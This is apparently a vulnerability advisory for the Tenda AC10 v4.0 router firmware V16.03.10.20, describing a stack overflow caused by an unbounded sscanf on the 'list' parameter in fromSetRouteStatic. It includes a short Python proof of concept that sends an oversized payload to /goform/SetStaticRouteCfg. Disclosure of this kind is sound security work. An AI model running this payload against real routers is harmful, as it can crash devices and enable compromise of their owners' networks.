# Tenda AC10 v16.03.10.20 fromSetRouteStatic

## Overview

- Manufacturer's website information：https://www.tenda.com.cn/

- Firmware download website: https://www.tenda.com.cn/material/show/103684

## Affected version

AC10 v4.0 V16.03.10.20

## Vulnerability details

The Tenda AC10 v4.0 V16.03.10.20 firmware has a stack overflow vulnerability in the `fromSetRouteStatic` function. The `dest` variable receives the `list` parameter from a POST request and is later assigned to function `save_staticroute_data`. 

![1735808232041](/img/1735808232041.png)

In the `save_staticroute_data` function, the `a2` (the value of `list`) is passed to `v5` and formatted by the `sscanf` function and in the form of `%[^,],%[^,],%[^,],%s`. This greedy matching mechanism is not secure, as long as the size of the data we enter is larger than the size of `v13, v14, v15, v16`, it will cause a stack overflow.

![1735808527617](/img/1735808527617.png)

![1735808341956](/img/1735808341956.png)

The user-provided `list` can trigger this security vulnerability.

## POC

```python
import requests
from pwn import*

url = "http://192.168.1.100/goform/SetStaticRouteCfg"
payload = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,a,a,aa"

data = {"list": payload}
response = requests.post(url, data=data)
print(response.text)
```

![1735808487726](/img/1735808487726.png)
